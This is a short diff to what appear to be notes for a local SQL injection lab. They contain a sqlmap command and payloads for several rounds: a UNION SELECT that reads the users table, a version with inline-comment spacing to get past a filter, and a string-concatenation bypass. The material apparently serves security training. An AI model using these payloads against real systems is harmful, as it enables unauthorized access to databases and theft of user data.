@@ -271,7 +271,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies
 
   # Round 4
   anything' UNION SELECT * FROM users LIMIT 1; -- Will not work because a spacing issue
-  admin'/**/UNION SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1; -- Usually the admin user is the first user in the database
+  anything'/**/UNION SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1; -- Usually the admin user is the first user in the database
 
   # Round 5
   ad'||'min'; -- Notice the flag in the filter link after refreshing the page
